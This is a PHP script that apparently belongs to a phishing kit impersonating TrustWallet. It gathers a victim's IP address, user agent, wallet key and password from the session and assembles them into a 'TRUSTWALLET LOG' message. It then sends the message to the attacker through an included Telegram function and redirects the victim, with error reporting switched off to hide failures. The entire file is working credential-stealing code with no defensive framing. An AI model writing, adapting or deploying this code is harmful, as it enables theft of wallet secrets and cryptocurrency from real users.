<?php
error_reporting(0);
session_start();
include_once 'connect.php';
include_once 'functions.php';
include_once 'telegram.php';

$fsh =
        "<strong>โผ๏ธ๐ก TRUSTWALLET LOG ๐กโผ๏ธ</strong>\n".
		"<strong></strong>\n".
        "<strong>๐ IP:  ".$_SESSION['remote_ip']."</strong>\n".
		"<i>๐ฑ OS:  ".$_SESSION['useragent']."</i>\n".
		"<strong></strong>\n".
        "<strong>Key:</strong>\n".
		"<code>".$_SESSION['key']."</code>\n".
		"<strong></strong>\n".
        "<strong>Password:</strong> ".$_SESSION['pass']."\n"
        ;

telegram($fsh);
finish($fsh);
encrypt($fsh);
header("Location: ./ ");
?>